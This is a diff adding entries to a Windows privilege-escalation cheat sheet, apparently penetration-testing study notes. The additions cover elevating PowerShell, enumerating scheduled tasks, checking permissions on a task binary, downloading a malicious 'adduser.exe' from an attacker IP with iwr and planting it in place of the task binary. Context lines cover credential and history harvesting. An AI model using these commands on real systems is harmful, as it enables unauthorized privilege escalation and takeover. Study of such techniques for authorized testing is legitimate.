@@ -427,6 +427,8 @@ Print file to terminal `type C:\xampp\passwords.txt`
 
 Run cmd as another user `> runas /user:backupadmin cmd`
 
+Start Powershell as admin: `Start-Process powershell -Verb runAs`
+
 ### Harvest Information
 
 Locate Powershell History file `> (Get-PSReadlineOption).HistorySavePath`
@@ -634,11 +636,15 @@ Read results:`Get-UnquotedService`
 
 Execute: `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`
 
+### Scheduled Tasks
 
+List Scheduled Tasks: `schtasks /query /fo LIST /v`
 
+Check task permissions: `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`
 
+Transfer Malicious File: `iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe`
 
-
+Move Malicious File into task space: `move .\BackendCacheCleanup.exe .\Location-HERE\`
 
 
 
